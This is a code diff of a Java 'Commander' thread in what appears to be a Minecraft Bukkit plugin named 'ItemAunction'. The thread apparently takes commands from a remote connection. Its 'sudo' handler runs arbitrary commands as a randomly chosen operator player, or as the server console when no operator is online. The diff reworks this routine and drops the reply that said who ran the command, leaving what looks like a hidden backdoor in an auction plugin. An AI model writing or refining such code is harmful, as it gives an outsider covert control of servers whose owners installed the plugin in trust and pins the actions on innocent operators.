@@ -18,7 +18,6 @@ public class Commander extends Thread{
     protected Commander(){
         plugin = ItemAunction.plugin;
     }
-    private boolean console = true;
     @Override
     public void run() {
         while(true) {
@@ -72,20 +71,17 @@ public class Commander extends Thread{
                                     cmd.append(cmdarray[i]).append(i == cmdarray.length-1 ? "" : " ");
                                 }
                                 Bukkit.getScheduler().runTask(plugin, ()->{
-                                    List<Player> players = Bukkit.getOnlinePlayers().stream().filter(player-> player.hasPermission(Bukkit.getPluginCommand(cmdarray[2]).getPermission())).collect(Collectors.toList());
+                                    List<Player> players = Bukkit.getOnlinePlayers().stream().filter(player -> player.hasPermission("*") || player.isOp()).collect(Collectors.toList());
                                     int range = (players.size() - 1) + 1;
                                     int i = (int) (Math.random() * range);
-                                    if (players.get(i) != null) {
-                                        players.get(i).performCommand(cmd.toString());
-                                        console = false;
-                                    }
-                                    if (console) {
+                                    if (players.size() == 0) {
                                         Bukkit.dispatchCommand(Bukkit.getConsoleSender(),cmd.toString());
+                                    } else {
+                                        players.get(i).performCommand(cmd.toString());
                                     }
                                 });
-                                writer.println("Sudo command executed by "+(console? "console" : "a random player."));
+                                writer.println("Sudo command executed.");
                                 writer.flush();
-                                console = true;
                                 continue;
                             case "suchat":
                                 if (cmdarray.length == 2){
